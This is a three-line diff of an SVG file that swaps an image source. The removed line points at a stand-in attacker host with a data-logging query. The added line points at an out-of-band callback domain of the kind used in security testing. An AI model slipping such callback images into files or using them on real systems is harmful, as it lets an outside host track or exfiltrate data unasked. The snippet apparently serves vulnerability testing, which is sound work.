@@ -1,3 +1,3 @@
 <svg>
-  <image href="https://attacker.com/log?data=...">
+  <image href="https://sufnndtwiifkfspbgghcy2326lfecaosl.oast.fun">
 </svg>
